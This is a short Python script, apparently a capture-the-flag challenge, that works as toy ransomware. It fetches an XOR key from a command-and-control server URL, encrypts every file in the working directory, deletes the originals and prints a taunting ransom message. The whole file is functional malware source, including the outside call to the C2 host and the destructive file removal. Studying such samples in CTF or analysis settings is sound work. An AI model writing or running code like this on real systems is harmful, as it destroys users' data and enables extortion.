#!/usr/bin/env python3

import requests
import glob
import os

C2 = "https://c2.task4233.dev/bD7bB7pc57d2"

def main():
    # get a key from a c2 server
    key = int(requests.get(C2).text)

    files = glob.glob('./*')
    # added for CTF:)
    assert "./taskctf_flag.txt" in files

    # encrypt all files
    for file in files:
        # ignore this script and directories
        if os.path.basename(file) == os.path.basename(__file__):
            continue
        if not os.path.isfile(file):
            continue

        # encrypt a target file
        data = None
        with open(file, 'r') as f:
            data = f.read()        
        encrypted = ""
        for ch in data:
            encrypted += chr(ord(ch) ^ key)
        with open(f"{file}.encrypted", 'w') as f:
            f.write(encrypted)
        
        # delete the raw file
        os.remove(file)
    
    print('\033[31m!!! YOUR FLAG HAS BEEN ENCRYPTED !!!\033[0m')
    print('\033[31mYou have two choices. Treat me when I see you next time, or decrypt it yourself if you can lol.\033[0m')

if __name__ == "__main__":
    main()
